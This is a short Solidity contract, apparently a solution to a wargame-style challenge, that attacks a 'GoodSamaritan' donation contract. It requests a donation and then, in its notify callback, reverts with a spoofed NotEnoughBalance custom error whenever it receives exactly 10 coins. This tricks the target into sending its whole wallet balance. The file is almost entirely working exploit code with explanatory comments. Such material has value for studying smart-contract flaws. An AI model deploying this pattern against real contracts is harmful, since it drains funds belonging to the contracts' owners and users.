// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// interface to call target function
interface IGoodSamaritan {
    function requestDonation() external returns (bool enoughBalance);
}

contract AttackGoodSamaritan {
    // error signature will be taken from here
    error NotEnoughBalance();

    // just requests a donation to start attack
    function attack(address _addr) external {
        IGoodSamaritan(_addr).requestDonation();
    }

    // notify is called when this contract receives coins
    function notify(uint256 amount) external pure {
        // only revert on 10 coins
        if (amount == 10) {
            revert NotEnoughBalance();
        }
    }
}
